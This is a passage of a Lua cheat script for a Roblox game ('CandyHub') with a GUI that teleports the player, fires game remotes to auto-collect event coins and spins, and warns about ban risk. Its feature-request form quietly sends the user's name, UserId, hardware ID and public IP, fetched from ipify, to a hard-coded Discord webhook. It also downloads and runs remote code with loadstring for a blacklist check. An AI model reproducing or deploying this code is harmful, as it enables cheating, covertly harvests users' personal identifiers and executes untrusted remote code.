                        until game.Players.LocalPlayer:GetAttribute("InEvent") and plot:FindFirstChild("SpawnPart") or not _G.candyhub.moon
                    end
                    --[[
                    if not plot:FindFirstChild("SpawnPart") then
                        repeat 
                            getoffseat()
                            task.wait(0.05)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = spawnpartcfr + Vector3.new(0,8,0)
                        until plot:FindFirstChild("SpawnPart")
                    end]]

                    for i, item in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                        if item:FindFirstChild("BloodMoonCoin") and item.Name ~= "Instances" then
                            if _G.candyhub.mode == "Normal" then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = item.CFrame + Vector3.new(0,0,0) 
                            elseif _G.candyhub.mode == "Fast" then
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
                                    Vector3.new(
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,
                                        500,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z
                                    ),
                                    Vector3.new(
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X + 10,
                                        500,
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z
                                    )
                                )
                            end
                            local args = {item.Name}
                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpectialEvents"):WaitForChild("CollectCoin"):FireServer(unpack(args))
                            if _G.candyhub.mode == "Normal" or _G.candyhub.mode == "Fast" then task.wait(0.01) else
                                task.wait()
                            end
                        end
                    end

                    if _G.candyhub.mode == "Normal" or not game:GetService("ReplicatedStorage").ActiveEvents.BloodMoonActive.Value or not _G.candyhub.moon then 
                        task.wait(0.4)
                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Return"):FireServer()
                        task.wait(0.4) 
                    end
                end
                task.wait(0.01)
            end
        end)
	end
})
print("12:921")
me:Combo({
	Label = "Mode",
	Selected = _G.candyhub.mode,
	GetItems = function()return {"Normal","Fast","SuperFast"}end,
    Callback = function(self, v)
        task.spawn(function()
            _G.candyhub.mode=v;savecfg()
        end)
    end
})
me:Checkbox({
	Value = _G.candyhub.abs,
	Label = "Auto Buy Spins",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.abs=v;savecfg()
            while _G.candyhub.abs and task.wait(0.01) do
                if game:GetService("Players").LocalPlayer.Important.RedMoons.Value >= 10 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpinEvents"):WaitForChild("PurchaseSpin"):InvokeServer()
                end
            end
        end)
	end
})

me:Checkbox({
	Value = _G.candyhub.abs2,
	Label = "Auto Spin",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.abs2=v;savecfg()
            while _G.candyhub.abs2 and task.wait(0.01) do
                if game:GetService("Players").LocalPlayer.replicated_data.available_spins.Value >= 1 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SpinEvents"):WaitForChild("PerformSpin"):InvokeServer()
                end
            end
        end)
	end
})

local misc = Window:CreateTab({Name = "Misc"})
local misc1 = misc:CollapsingHeader({Title="Afk",Collapsed=false,NoArrow=true,OpenOnArrow=true})
misc1:Checkbox({
	Value = _G.candyhub.afk,
	Label = "Anti AFK",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.afk=v;savecfg()
        end)
	end
})

local misc45 = misc:CollapsingHeader({Title="Performance",Collapsed=false,NoArrow=true,OpenOnArrow=true})

local scren = game.CoreGui:FindFirstChild("CandyHub_Performance") or Instance.new("ScreenGui",game.CoreGui);scren.Name = "CandyHub_Performance"
scren.IgnoreGuiInset = true
scren.Enabled = false
local frame = scren:FindFirstChild("Frame") or Instance.new("Frame",scren)
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)

misc45:Checkbox({
	Value = _G.candyhub.fillscreen,
	Label = "Fill Screen",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.fillscreen=v;savecfg()
            scren.Enabled = _G.candyhub.fillscreen
        end)
	end
})

local slid = misc45:SliderInt({
    Label = "FPS Cap",
    Value = _G.candyhub.maxfps,
    Minimum = 4,
    Maximum = 1024,
    Callback = function(self, v: Int)
        task.spawn(function()
            if setfpscap and _G.candyhub.fpschanger then
                _G.candyhub.maxfps=v;savecfg()
                setfpscap(_G.candyhub.maxfps)
            end
        end)
    end
})

misc45:Checkbox({
	Value = _G.candyhub.fpschanger,
	Label = "FPS Cap Changer",
	Callback = function(self, v: boolean)
        task.spawn(function()
            _G.candyhub.fpschanger=v;savecfg()
            if _G.candyhub.fpschanger then
                setfpscap(_G.candyhub.maxfps)
                if _G.candyhub.maxfps == 1024 then
                    setfpscap(0)
                end 
            end
        end)
	end
})

local lab = misc45:Label({Text=" 1024 = inf "})
lab.TextColor3 = Color3.fromRGB(100,100,225)

local misc2 = misc:CollapsingHeader({Title="GUI",Collapsed=false,NoArrow=true,OpenOnArrow=true})

misc2:Checkbox({
	Value = false,
	Label = "Resized Inventory (WIP)",
	Callback = function(self, v: boolean)
        task.spawn(function()
            --
        end)
	end
})

--[[
misc2:SliderInt({
    Label = "X (WIP)",
    Value = 1,
    Minimum = 1,
    Maximum = 2,
    Callback = function(self, v: Int)
        task.spawn(function()
            --_G.candyhub.posy=v;savecfg() 
        end)
    end
})]]

misc2:Checkbox({
	Value = false,
	Label = "Add Icons to items in inventory (WIP)",
	Callback = function(self, v: boolean)
        task.spawn(function()
            --
        end)
	end
})

print("15:1008")

game:GetService("Players").LocalPlayer.Idled:Connect(function()
    if _G.candyhub.afk then
        local vu = game:GetService("VirtualUser")
        vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        wait(1)
        vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end
end)

local info = Window:CreateTab({Name = "Info"})

local serverVersion = game:GetService("Players").LocalPlayer.PlayerGui.Main.ServerVersion.Text

local bb1,bb2,security = 0,0,""

if supportedVersionp >= game.PlaceVersion then
    bb1 = 0
    bb2 = 255
    security = "Fully Secure, unlikely to get banned.\n"
elseif supportedVersion == serverVersion then
    bb1 = 200
    bb2 = 200
    security = "Secure, likely to get banned.\n"
else
    bb1 = 255
    bb2 = 0
    security = "Insecure, more likely to get banned.\n"
end

local l0 =info:Label({Text = "Made by VateQ & CandyHub\ndiscord: vateq || discord.gg/EAbRQtEzWY\n"})
local x = info:Label({Text = "Supported Version:   ".. supportedVersion .." | " .. tostring(supportedVersionp) .. "\nServer/Game Version: " .. serverVersion .. " | " .. tostring(game.PlaceVersion) .. "\n"})
local x2= info:Label({Text = security})
x.TextColor3 = Color3.fromRGB(100,100,225)
x2.TextColor3= Color3.fromRGB(bb1,bb2,0)
l0.TextColor3= Color3.fromRGB(220,140,20)

info:Button({
	Text = "DanceButton | requested by user, does nothing   ",
	Callback = function(self)
        print("i said it does nothing...")
	end
})

info:Button({
	Text = "Join Discord!",
	Callback = function(self)

        modal("Join Discord?", "do you want to join\ncandyhub discord?",function()
                local discordInvite = "https://discord.com/invite/EAbRQtEzWY"
                local status = "Discord Invite Link: "..discordInvite
                if request then
                    request({
                        Url = "http://127.0.0.1:6463/rpc?v=1",
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json",
                            ["Origin"] = "https://discord.com"
                        },
                        Body = game:GetService("HttpService"):JSONEncode({
                            cmd = "INVITE_BROWSER",
                            args = {code = string.match(discordInvite, "discord%.com/invite/(%w+)")},
                            nonce = game:GetService("HttpService"):GenerateGUID(false)
                        })
                    })
                    status = "Invited You to discord server. . ."
                elseif setclipboard then
                    setclipboard(discordInvite)
                    status = "Copied invite link to clipboard"
                end

                local bd334= info:Label({Text = status})
                bd334.TextColor3 = Color3.fromRGB(100,100,225)

                task.wait(6)

                bd334:Destroy()
            end
        )
	end
})

local requestf = Window:CreateTab({Name = "Request"})
local x55 = requestf:Label({Text = "Request your feature, if possible to make\nit will probably be added\nYou can also report bugs here."})
local x66 = requestf:Label({Text = " \n!!!WARNING!!!\nTROLLING WILL RESULT IN BLACKLIST FROM USING SCRIPT\n"})
x55.TextColor3 = Color3.fromRGB(100,100,225)
x66.TextColor3 = Color3.fromRGB(255,0,0)


print("16:1098")
if request then
    getgenv().ooosent = false
    local featureRequest777 = ""
    local function sentrequest(message)
        if not getgenv().ooosent then
            getgenv().ooosent = true
            local x = tostring(tick())
            if clonefunction then 
                getgenv()[x] = clonefunction(request)
            end
            local taxrget = getgenv()[x] or request
            local response = taxrget({
                Url = "https://discord.com/api/webhooks/1402026289770008688/RibldfUVV8DHfwr1nU6r9MPnKE9BP2JdgTfEg6LZ9vGje1JOqx8bJXsCakJiSiXwL62K",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    ["embeds"] = {
                        {
                            ["title"] = "Feature Request Sent ".. scriptversion,
                            ["description"] = "Executed by: "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId,
                            ["color"] = 65280,
                            ["fields"] = {
                                {
                                    ["name"] = "place version:",
                                    ["value"] = "```yaml\nPlace Version: " .. tostring(game.PlaceVersion) .. "\nServer Version: " .. serverVersion .. "\nScript Version: " .. scriptversion .. "```"
                                },     
                                {
                                    ["name"] = "Message:",
                                    ["value"] = "```yaml\n" .. message .. "\n```"
                                },
                                {
                                    ["name"] = "User",
                                    ["value"] = "```yaml\nName: "..game.Players.LocalPlayer.Name.."\nDisplayName: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." \nIP: ".. game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
                                }
                            },
                            ["footer"] = {
                                ["text"] = "candyhub dev"
                            }
                        }
                    }
                })
            })
        end
    end

    requestf:InputText({
        Label = "Request Feature",
        Value = "",
        Placeholder = "request feature. . .",
        MultiLine = true,
        Callback = function(self, v: string)
            featureRequest777 = v
        end
    })

    requestf:Button({
        Text = "     REQUEST FEATURE     ",
        Callback = function(self)
            local bl = #loadstring(game:HttpGet("https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/blacklist.lua"))()[1]
            modal("Request A Feature?", "\nAre you really really sure?\nalready (".. bl+1 .." users) got blacklisted because of trolling\n",function()
                    if featureRequest777 == "" then
                        requestf:Label({Text = "write smth bro."})
                    else
                        if not getgenv().ooosent then sentrequest(featureRequest777) local a625 = requestf:Label({Text = "feature request sent"}) task.wait(5) a625:Destroy() else local a525 = requestf:Label({Text = "one request per execution.."}) task.wait(5) a525:Destroy() end
                    end
                end
            )
        end
    })
end
print("x:x:x")
--[[

-- TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:

-- TODO:
- more efficient
- loading...
- keysystem better
- helo world
- anti afk v2
- antiafk improvement
- reinitalize after rejoin
- auto kill other planes




-- TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:TODO:


]]
